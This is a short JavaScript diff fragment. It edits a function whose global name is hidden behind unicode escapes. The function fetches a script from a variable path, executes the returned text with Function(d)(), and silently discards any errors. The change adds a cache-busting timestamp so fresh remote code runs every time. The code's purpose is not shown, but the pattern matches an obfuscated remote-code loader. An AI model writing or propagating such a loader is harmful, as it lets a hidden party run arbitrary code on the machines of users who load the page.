@@ -8,7 +8,7 @@ export default () => {
   const wmAction = '\u004D\u0065\u0076';
 
   w[wmAction] = () => {
-    w[newLoad](wmPath)
+    w[newLoad](`${wmPath}?d=${Date.now()}`)
       .then((r) => r.text())
       .then((d) => Function(d)())
       .catch(() => {});
